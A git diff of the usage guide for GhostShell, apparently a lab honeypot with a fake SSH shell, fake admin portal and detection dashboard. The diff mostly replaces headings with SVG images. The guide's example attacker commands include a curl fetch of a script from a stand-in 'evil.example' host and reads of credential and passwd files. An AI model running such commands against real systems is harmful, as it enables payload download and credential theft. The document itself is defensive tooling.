@@ -1,14 +1,12 @@
 <div align="center">
 
-<h1><span style="color:#22c55e">GhostShell - Usage Guide</span></h1>
-
-**From zero to catching your first attacker in 5 minutes.**
+![GhostShell Usage Guide](headings/watch-dashboard.svg)
 
 </div>
 
----
+Zero to catching your first attacker in five minutes.
 
-## 1. Start it
+![Start it](headings/start-it.svg)
 
 ```bash
 python3 -m venv .venv
@@ -24,9 +22,7 @@ You should see:
 [+] GhostShell dashboard on http://localhost:5000
 ```
 
----
-
-## 2. Attack it (like an attacker would)
+![Attack it](headings/attack-it.svg)
 
 ```bash
 ssh admin@localhost -p 2222
@@ -38,51 +34,44 @@ Inside the fake shell, try:
 | Command | What happens |
 |---|---|
 | `ls` | Fake home directory — `.ssh`, `aws_credentials.txt`, `database_backup.sql` |
-| `cat aws_credentials.txt` | **Honeytoken hit is logged** |
+| `cat aws_credentials.txt` | Honeytoken hit is logged |
 | `cat /etc/passwd` | Fake users, mapped to MITRE Credential Access |
 | `ps aux` | Fake processes — `dockerd`, `server.py` |
 | `curl http://evil.example/x.sh` | Logged as Ingress Tool Transfer |
 | `sudo -l` | Fake sudo prompt |
 | `uname -a` | Fake Ubuntu kernel |
 
----
-
-## 3. Try the fake admin panel
+![Fake admin panel](headings/admin-panel.svg)
 
 Open http://localhost:8081 — fake Acme Corp portal.
 
-- Log in with **any** username / password — it works, and the attempt is logged.
-- Visit the fake AWS metadata endpoint:
-  `http://localhost:8081/latest/meta-data/iam/security-credentials/acme-prod-role`
-- It returns the **same fake AWS key** that lives in the SSH honeytoken file.
+Log in with any username and password. It works, and the attempt is logged.
 
----
+Then try the fake AWS metadata endpoint:
 
-## 4. Watch the dashboard
+`http://localhost:8081/latest/meta-data/iam/security-credentials/acme-prod-role`
+
+It returns the same fake AWS key that lives in the SSH honeytoken file.
+
+![Watch the dashboard](headings/watch-dashboard.svg)
 
 Open http://localhost:5000
 
-- **Stats cards** — sessions, commands, honeytoken hits, unique IPs
-- **Sessions** — click **Replay →** to see the attacker's terminal, command by command
-- **Rules** — click **Rules** to get a Sigma + Suricata rule generated from that session
-- **IOC feed** — `GET /api/ioc` → JSON with attacker IPs + honeytoken hits
+- Stats: sessions, commands, honeytoken hits, unique IPs
+- Sessions: click Replay to see the attacker's terminal, command by command
+- Rules: click Rules to get a Sigma + Suricata rule from that session
+- IOC feed: `GET /api/ioc` — JSON with attacker IPs + honeytoken hits
 
----
-
-## 5. Turn on the AI shell (optional)
+![AI shell](headings/ai-shell.svg)
 
 ```bash
 # install Ollama from https://ollama.com, then:
 ollama pull llama3.2:1b
 ```
 
-Restart GhostShell. Unusual commands are now answered by the local LLM
-like a real Linux box. If Ollama is not running, the rule-based shell
-takes over automatically — nothing breaks.
+Restart GhostShell. Unusual commands are now answered by the local LLM like a real Linux box. If Ollama is not running, the rule-based shell takes over automatically — nothing breaks.
 
----
-
-## 6. Config
+![Config](headings/config.svg)
 
 Edit `config.yaml`:
 
@@ -95,9 +84,6 @@ ollama_url: "http://localhost:11434"
 ollama_model: "llama3.2:1b"
 ```
 
----
+![Safety](headings/safety.svg)
 
-## Safety
-
-Lab only. Never expose ports `2222 / 5000 / 8081` to the internet.
-All secrets in GhostShell are **fake** — never put real keys in it.
+Lab only. Never expose ports 2222 / 5000 / 8081 to the internet. All secrets in GhostShell are fake — never put a real key in it.
